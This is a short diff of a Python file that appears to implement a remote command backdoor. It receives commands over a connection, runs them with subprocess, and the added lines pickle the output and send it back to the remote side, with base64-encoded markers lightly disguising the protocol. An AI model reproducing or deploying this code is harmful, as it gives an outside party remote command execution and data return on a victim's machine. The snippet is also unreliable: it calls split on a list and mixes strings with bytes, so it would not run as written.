@@ -21,6 +21,8 @@ def main():
                 raw_command = str(data).split('Y29tbWFuZA==')
                 print(raw_command)
                 output=subprocess.check_output([raw_command.split(' ')])
+                raw_output = pickle.dumps(output)
+                conn.send('b3V0cHV0Cg==' + raw_output)
             else:
                 pass
             if data == 'a_ha':
